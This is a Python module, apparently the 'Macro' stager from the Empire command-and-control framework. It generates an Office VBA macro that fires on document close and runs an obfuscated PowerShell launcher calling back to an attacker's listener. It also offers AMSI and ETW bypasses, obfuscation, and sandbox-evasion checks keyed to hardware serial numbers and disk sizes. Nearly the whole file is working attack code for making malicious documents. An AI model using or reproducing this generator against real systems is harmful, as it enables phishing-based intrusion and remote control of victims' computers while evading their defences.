from __future__ import print_function
from builtins import str
from builtins import range
from builtins import object
from empire.server.common import helpers
import random, string


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Macro',

            'Author': ['@enigma0x3', '@harmj0y'],

            'Description': 'Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.',

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': ''
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            },
            'OutlookEvasion': {
                'Description': 'Include BC-Security\'s Outlook Sandbox evasion code',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        safe_checks = self.options['SafeChecks']['Value']
        bypasses = self.options['Bypasses']['Value']
        outlook_evasion = self.options['OutlookEvasion']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        invoke_obfuscation = False
        if obfuscate.lower() == "true":
            invoke_obfuscation = True

        outlook_evasion_bool = False
        if outlook_evasion.lower() == "true":
            outlook_evasion_bool = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=encode,
                                                           obfuscate=invoke_obfuscation,
                                                           obfuscationCommand=obfuscate_command,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries, safeChecks=safe_checks,
                                                           bypasses=bypasses)

        set_string = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(1, len(listener_name))))
        set_method = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(1, len(listener_name))))

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            chunks = list(helpers.chunks(launcher, 50))
            payload = "\tDim " + set_string + " As String\n"
            payload += "\t" + set_string + " = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                payload += "\t" + set_string + " = " + set_string + " + \"" + str(chunk) + "\"\n"

            macro = "Sub AutoClose()\n"
            macro += "\t" + set_method + "\n"
            macro += "End Sub\n\n"

            macro += "Public Function " + set_method + "() As Variant\n"

            if outlook_evasion_bool == True:
                macro += "\tstrComputer = \".\"\n"
                macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\cimv2\")\n"
                macro += "\tSet ID = objWMIService.ExecQuery(\"Select IdentifyingNumber from Win32_ComputerSystemproduct\")\n"
                macro += "\tFor Each objItem In ID\n"
                macro += "\t\tIf StrComp(objItem.IdentifyingNumber, \"2UA20511KN\") = 0 Then End\n"
                macro += "\tNext\n"
                macro += "\tSet disksize = objWMIService.ExecQuery(\"Select Size from Win32_logicaldisk\")\n"
                macro += "\tFor Each objItem In disksize\n"
                macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
                macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
                macro += "\tNext\n"

            macro += payload
            macro += "\tSet asd = CreateObject(\"WScript.Shell\")\n"
            macro += "\tasd.Run(" + set_string + ")\n"
            macro += "End Function\n"

            return macro
